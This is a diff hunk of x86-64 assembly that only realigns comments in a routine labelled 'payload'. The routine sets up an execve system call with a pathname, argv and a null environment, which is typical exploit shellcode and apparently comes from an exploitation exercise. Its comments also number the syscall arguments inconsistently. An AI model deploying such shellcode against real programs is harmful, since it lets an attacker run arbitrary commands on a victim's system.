@@ -18,13 +18,13 @@ main:
 payload:
 
         movq    $file_to_run, %rcx
-        movq    %rcx, (ARGV)(%rcx)            /* set up argv pointer to pathname */
+        movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         xorq    %rax, %rax               /* get a 64-bit zero value */
         movq    %rax, (STRLEN)(%rcx)     /* null-terminate our string */
         movq    %rax, (ENVP)(%rcx)       /* set up null envp */
 
-        movq    $SYS_execve, %rax                /* syscall arg 1: syscall number */
+        movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
         leaq    ARGV(%rcx), %rsi         /* syscall arg 2: argv */
         leaq    ENVP(%rcx), %rdx         /* syscall arg 3: envp */
